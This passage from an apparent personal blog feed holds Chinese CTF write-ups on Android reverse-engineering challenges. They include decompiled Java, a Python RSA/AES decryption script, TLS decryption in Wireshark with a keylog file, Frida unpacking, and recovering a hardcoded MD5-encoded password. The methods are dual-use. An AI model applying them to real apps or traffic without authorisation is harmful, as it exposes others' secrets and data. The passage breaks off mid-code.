<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> String <span class="title function_">funcA</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">MessageDigest</span> <span class="variable">messageDigest</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        <span class="type">Charset</span> <span class="variable">charset</span> <span class="operator">=</span> Charsets.UTF_8;</span><br><span class="line">        <span class="keyword">if</span> (str == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TypeCastException</span>(<span class="string">&quot;null cannot be cast to non-null type java.lang.String&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = str.getBytes(charset);</span><br><span class="line">        Intrinsics.checkExpressionValueIsNotNull(bytes, <span class="string">&quot;(this as java.lang.String).getBytes(charset)&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] m = messageDigest.digest(bytes);</span><br><span class="line">        <span class="type">MainActivity$funcA$1</span> <span class="variable">mainActivity$funcA$1</span> <span class="operator">=</span> MainActivity$funcA$<span class="number">1.</span>INSTANCE;</span><br><span class="line">        Intrinsics.checkExpressionValueIsNotNull(m, <span class="string">&quot;m&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> mainActivity$funcA$<span class="number">1.</span>invoke(m);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">invoke</span><span class="params">(<span class="type">byte</span> b)</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">format</span> <span class="operator">=</span> String.format(<span class="string">&quot;%02X&quot;</span>, Arrays.copyOf(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Byte.valueOf(b)&#125;, <span class="number">1</span>));<span class="comment">//此处是大写的hex字符串</span></span><br><span class="line">                Intrinsics.checkExpressionValueIsNotNull(format, <span class="string">&quot;java.lang.String.format(this, *args)&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> format;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>AES解密的算法可以简化为</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">substring3</span> <span class="operator">=</span> str.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line"><span class="type">byte</span>[] bytes = substring3.getBytes(Charsets.UTF_8);</span><br><span class="line"><span class="type">SecretKeySpec</span> <span class="variable">secretKeySpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(bytes, <span class="string">&quot;AES&quot;</span>);<span class="comment">//md5前16个字符串作为密钥</span></span><br><span class="line"><span class="type">String</span> <span class="variable">substring4</span> <span class="operator">=</span> str.substring(<span class="number">16</span>);</span><br><span class="line"><span class="type">byte</span>[] bytes2 = substring4.getBytes(Charsets.UTF_8);</span><br><span class="line"><span class="type">IvParameterSpec</span> <span class="variable">ivParameterSpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(bytes2);<span class="comment">//md5后16个字符串作为偏移</span></span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS7Padding&quot;</span>);<span class="comment">//注意此处是带填充的</span></span><br><span class="line">        cipher.init(<span class="number">2</span>, secretKeySpec, ivParameterSpec);<span class="comment">//解密模式</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">open</span> <span class="operator">=</span> getAssets().open(<span class="string">&quot;enc&quot;</span>);</span><br><span class="line">        Intrinsics.checkExpressionValueIsNotNull(open, <span class="string">&quot;assets.open(\&quot;enc\&quot;)&quot;</span>);<span class="comment">//解密文件</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(getMsgFile()).write(cipher.doFinal(IOStreams.readBytes(open)));</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h2 id="python-解密脚本"><a href="#python-解密脚本" class="headerlink" title="python 解密脚本"></a>python 解密脚本</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line">base=<span class="string">&quot;j7WBExN4XN/P2HVCOFssAAquRgdQCqdWZKwDo9uTBLfcLpC+1XC6DmBokh5twaS7Ip1MBIEAlFX2WEzz2H9qwXT5WEUgzC4RF0AOe95wqU89oqf4dn7/ZiO2imb5a6FrDnpwo6SqtdhasU3OrGg7mgtapukCHjjmJH7Vx+yVPm0uR40bgxVCIPtnJ+b6iNp8o+Cgyrd2BZ/TCQX1GJz3pM80+cV5cZOMjr/JepVcWFN+7GNKxR8jaPa/bV+C7Y+S&quot;</span></span><br><span class="line">cipher_bytes = base64.b64decode(base)</span><br><span class="line">tmp1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(cipher_bytes),<span class="number">64</span>):</span><br><span class="line">    tmp1.append(cipher_bytes[i:i+<span class="number">64</span>]) <span class="comment">#64个字节一组</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">p=<span class="number">71037807056497808667473611757425298887086548124211388066888426631640585037969</span></span><br><span class="line">q=<span class="number">112145533787143859495414888829654253787274898301436147509050442708404900683727</span></span><br><span class="line">n=<span class="number">7966572791419081482888151379127643748169118610600984895753957531413662475745737840799418096417263789370960837649556218062403972113814987633647934355430463</span></span><br><span class="line">d=gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">tmp2=[]</span><br><span class="line">tmp3=[]</span><br><span class="line">tmp4=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp1:</span><br><span class="line">	tmp2.append(<span class="built_in">pow</span>(bytes_to_long(i),d,n))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp2:</span><br><span class="line">	tmp3.append(long_to_bytes(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp3:</span><br><span class="line">	tmp4+=i.decode()</span><br><span class="line">tmp=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(tmp4.replace(<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\x00&#x27;</span>,<span class="string">&#x27;&#x27;</span>)),<span class="number">8</span>):</span><br><span class="line">	tmp+=<span class="built_in">chr</span>(<span class="built_in">int</span>(tmp4.replace(<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line">tmp=<span class="built_in">str</span>.upper(<span class="built_in">__import__</span>(<span class="string">&quot;hashlib&quot;</span>).md5(tmp.encode()).hexdigest())</span><br><span class="line">password=tmp[<span class="number">0</span>:<span class="number">16</span>].encode()</span><br><span class="line">iv=tmp[<span class="number">16</span>:].encode()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;.\resources\assets\enc&#x27;,&#x27;rb&#x27;) as e:</span></span><br><span class="line"><span class="string">	with open(r&#x27;.\resources\assets\dec.7z&#x27;,&quot;</span>wb+<span class="string">&quot;)as d:</span></span><br><span class="line"><span class="string">		enc=e.read()</span></span><br><span class="line"><span class="string">		cipher=AES.new(password,AES.MODE_CBC,iv)</span></span><br><span class="line"><span class="string">		dec=cipher.decrypt(enc)</span></span><br><span class="line"><span class="string">		dec=unpad(dec,AES.block_size)</span></span><br><span class="line"><span class="string">		d.write(dec)</span></span><br></pre></td></tr></table></figure></div>

<p>解密后的文件是个,7z的压缩包</p>
<h1 id="TLS解密"><a href="#TLS解密" class="headerlink" title="TLS解密"></a>TLS解密</h1><p>解压后的文件有一个数据包文件和一个keylog文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307132115171.png"
                      alt="image-20230713211514142"
                ></p>
<p>用wireshark打开数据包文件追踪TLS流发现没有显示，又根据keylog文件猜测是TLS进行了加密，直接导入keylog文件(之前获取密钥的日志文件)就可以解密了</p>
<p>具体操作</p>
<pre class="mermaid">graph TB
A1[左上角的编辑选项]
A2[点击编辑选项最下面的首选项]
A3[点击左侧的Protocols的小三角]
A4[在展开的栏目中点击TLS]
A5["(Pre)-Master-Secret log filename中填入keylog文件的路径"]
A1-->A2-->A3-->A4-->A5</pre>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307132124193.png"
                      alt="image-20230713212426147"
                ></p>
<p>最后直接点OK就行</p>
<p> 选择解密后多出来的http流，右键选择追踪TLS流就可以得到flag了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307132126665.png"
                      alt="image-20230713212620547"
                ></p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>网鼎杯2020青龙组bang1</title>
    <url>/2023/06/06/CTF%20WP/Re/%E5%AE%89%E5%8D%93/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84bang1/</url>
    <content><![CDATA[<p>[网鼎杯 2020 青龙组]bang</p>
<p>使用jadx分析，发现源代码少的可怜，可能是加过壳的。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306061732253.png"
                      alt="image-20230606173216203"
                ></p>
<p>用查壳器看了一下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306061733750.png"
                      alt="image-20230606173355704"
                ></p>
<p>使用frida进行脱壳，第一个dex文件就是其对应的主代码逻辑</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306061904770.png"
                      alt="image-20230606190443599"
                ></p>
<p>找到了对应的flag</p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>羊城杯 2021Ez_android</title>
    <url>/2023/06/23/CTF%20WP/Re/%E5%AE%89%E5%8D%93/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202021Ez_android/</url>
    <content><![CDATA[<p>两个activity，需要注意</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;30&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;11&quot;</span> <span class="attr">package</span>=<span class="string">&quot;top.zjax.login&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;30&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;11&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;30&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Login&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;top.zjax.login.MainActivity&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;top.zjax.login.CheckFlagActivity&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>mainactivity</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.zjax.login;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStreamWriter;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> <span class="keyword">implements</span> <span class="title class_">View</span>.OnClickListener &#123;</span><br><span class="line">    <span class="type">Button</span> <span class="variable">loginBtn</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">EditText</span> <span class="variable">useridEt</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">EditText</span> <span class="variable">passEt</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">TextView</span> <span class="variable">promptText</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(C0818R.layout.activity_main);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(C0818R.C0821id.loginBtn);</span><br><span class="line">        <span class="built_in">this</span>.loginBtn = button;</span><br><span class="line">        button.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">        <span class="built_in">this</span>.useridEt = (EditText) findViewById(C0818R.C0821id.userId);</span><br><span class="line">        <span class="built_in">this</span>.passEt = (EditText) findViewById(C0818R.C0821id.pass);</span><br><span class="line">        <span class="built_in">this</span>.promptText = (TextView) findViewById(C0818R.C0821id.promptText);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">trim</span> <span class="operator">=</span> <span class="built_in">this</span>.useridEt.getText().toString().trim();</span><br><span class="line">        <span class="type">String</span> <span class="variable">trim2</span> <span class="operator">=</span> <span class="built_in">this</span>.passEt.getText().toString().trim();</span><br><span class="line">        <span class="keyword">if</span> (trim.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.promptText.setText(C0818R.string.userIdError);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (trim2.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.promptText.setText(C0818R.string.passError);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (checkUsername(trim) &amp;&amp; checkPasswd(trim2)) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, (<span class="type">int</span>) C0818R.string.loginSuccess, <span class="number">1</span>).show();</span><br><span class="line">            getKeyAndRedirect(trim2);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, (<span class="type">int</span>) C0818R.string.loginError, <span class="number">1</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username.equals(getString(C0818R.string.username));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkPasswd</span><span class="params">(String passwd)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getEncodeStr(passwd).equals(getString(C0818R.string.passwd));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getEncodeStr</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bArr = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            bArr = MessageDigest.getInstance(getString(C0818R.string.encode)).digest(str.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bArr.length; i++) &#123;</span><br><span class="line">                bArr[i] = (<span class="type">byte</span>) (bArr[i] - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="number">1</span>, bArr).toString(<span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getKeyAndRedirect</span><span class="params">(<span class="keyword">final</span> String passwd)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123; <span class="comment">// from class: top.zjax.login.-$$Lambda$MainActivity$6RDmmwJ9hKunKEQ8YxFB_mVwQ0E</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// java.lang.Runnable</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                MainActivity.<span class="built_in">this</span>.lambda$getKeyAndRedirect$<span class="number">0</span>$MainActivity(passwd);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">this</span>.key.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000L</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, CheckFlagActivity.class);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;key&quot;</span>, <span class="built_in">this</span>.key);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="comment">/* synthetic */</span> <span class="keyword">void</span> lambda$getKeyAndRedirect$<span class="number">0</span>$MainActivity(<span class="keyword">final</span> String passwd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(<span class="string">&quot;139.224.191.201&quot;</span>, <span class="number">20080</span>);</span><br><span class="line">            <span class="type">BufferedWriter</span> <span class="variable">bufferedWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(socket.getOutputStream()));</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(socket.getInputStream()));</span><br><span class="line">            bufferedWriter.write(passwd);</span><br><span class="line">            bufferedWriter.newLine();</span><br><span class="line">            bufferedWriter.flush();</span><br><span class="line">            setKey(bufferedReader.readLine().split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>].trim());</span><br><span class="line">            bufferedReader.close();</span><br><span class="line">            bufferedWriter.close();</span><br><span class="line">            socket.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setKey</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过查字符串表获取username和passwd</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username.equals(getString(C0818R.string.username));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkPasswd</span><span class="params">(String passwd)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getEncodeStr(passwd).equals(getString(C0818R.string.passwd));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">getEncodeStr</span><span class="params">(String str)</span> &#123;<span class="comment">//此处是md5算法</span></span><br><span class="line">        <span class="type">byte</span>[] bArr = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            bArr = MessageDigest.getInstance(getString(C0818R.string.encode)).digest(str.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bArr.length; i++) &#123;</span><br><span class="line">                bArr[i] = (<span class="type">byte</span>) (bArr[i] - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="number">1</span>, bArr).toString(<span class="number">16</span>);</span><br><span class="line">    &#125;<span class="comment">//此处将md5后的每2个16进制数减了1</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;encode&quot;</span>&gt;</span>md5<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="comment">&lt;!--上图的C0818R.string.encode--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;passwd&quot;</span>&gt;</span>c232666f1410b3f5010dc51cec341f58<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="comment">&lt;!--此处是经过md5和一个自定义编码的passwd--&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>实际的md5(passwd)为</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">In [1]: str1=&#x27;c232666f1410b3f5010dc51cec341f58&#x27;</span><br><span class="line">In [8]: tmp1=&#x27;&#x27;</span><br><span class="line">   ...: for i in range(0,len(str1),2):</span><br><span class="line">   ...:     tmp1+=&#x27;&#123;:0&gt;2X&#125;&#x27;.format(int(str1[i]+str1[i+1],16)+1)</span><br><span class="line">   ...:</span><br><span class="line"></span><br><span class="line">In [9]: tmp1</span><br><span class="line">Out[9]: &#x27;C33367701511B4F6020EC61DED352059&#x27;</span><br></pre></td></tr></table></figure></div>

<p>passwd</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306231922128.png"
                      alt="image-20230623192207082"
                ></p>
<p>其连接了一个链接输入了passwd获取了key</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="comment">/* synthetic */</span> <span class="keyword">void</span> lambda$getKeyAndRedirect$<span class="number">0</span>$MainActivity(<span class="keyword">final</span> String passwd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(<span class="string">&quot;139.224.191.201&quot;</span>, <span class="number">20080</span>);</span><br><span class="line">            <span class="type">BufferedWriter</span> <span class="variable">bufferedWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(socket.getOutputStream()));</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(socket.getInputStream()));</span><br><span class="line">            bufferedWriter.write(passwd);</span><br><span class="line">            bufferedWriter.newLine();</span><br><span class="line">            bufferedWriter.flush();</span><br><span class="line">            setKey(bufferedReader.readLine().split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>].trim());</span><br><span class="line">            bufferedReader.close();</span><br><span class="line">            bufferedWriter.close();</span><br><span class="line">            socket.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setKey</span><span class="params">(String key)</span> 